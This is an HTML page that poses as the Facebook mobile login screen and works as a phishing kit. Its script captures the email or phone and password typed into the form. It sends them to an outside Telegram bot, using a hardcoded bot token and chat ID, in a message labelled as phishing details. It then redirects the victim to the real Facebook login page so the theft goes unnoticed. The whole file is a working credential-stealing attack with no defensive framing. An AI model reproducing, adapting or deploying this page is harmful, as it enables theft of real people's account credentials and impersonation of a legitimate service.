<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body {
            font-family: 'Helvetica Neue', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, rgba(242, 246, 255, 1) 0%, rgba(231, 245, 255, 1) 100%);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 100vh;
            overflow: hidden;
        }

        .language {
            font-size: 14px;
            color: #606770;
            text-align: center;
            margin: 15px 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
            margin: 0 auto;
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .logo {
            width: 57px;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            margin: 10px 0;
            border: 1px solid #dddfec;
            border-radius: 10px;
            font-size: 17px;
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 17px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #155db2;
        }

        .forgot-password {
            display: block;
            margin-top: 20px;
            font-size: 15px;
            color: black;
            text-decoration: none;
        }

        .create-account-btn {
            display: inline-block;
            padding: 12px 0;
            width: 80%;
            border: 1px solid #1877f2;
            color: #1877f2;
            border-radius: 20px;
            background-color: transparent;
            font-size: 17px;
            cursor: pointer;
            margin-top: 70px;
        }

        .create-account-btn:hover {
            background-color: #e7f3ff;
        }

        .meta-logo {
            font-size: 14px;
            color: #606770;
            display: flex;
            justify-content: center;
            font-weight: bold;
            align-items: center;
            margin: 20px 0;
        }

        .meta-logo img {
            width: 60px;
            margin-right: 8px;
        }
    </style>
</head>
<body>

    <div class="language">English (UK)</div>

    <div class="container">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
        </div>

        <form id="loginForm">
            <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>

        <a href="#" class="forgot-password">Forgotten Password?</a>
    </div>
    <center>

    <button class="create-account-btn">Create new account</button>

    <div class="meta-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png" alt="Meta Logo">
    </div>
    
<script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const emailOrPhone = document.getElementById('emailOrPhone').value;
        const password = document.getElementById('password').value;

        const token = '7635719987:AAFMID_CdjT_ZFK0I_1fhIy9RfjDr413trA'; 
        const chat_id = '5549167441';  
        const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;

        const message = `🎣FB PHISHING DETAILS:\n👤Email/Phone: ${emailOrPhone}\n🔑Password: ${password}\n@Randomx001`;

        fetch(telegramURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: message
            })
        }).then(response => {
            if (response.ok) {
                window.location.href = 'https://m.facebook.com/login/';
            } else {
                alert('Invalid username or password');
            }
        }).catch(error => {
            console.error('Error:', error);
            alert('Error sending data to Telegram. Please check the console.');
        });
    });
</script>

</body>
</html>
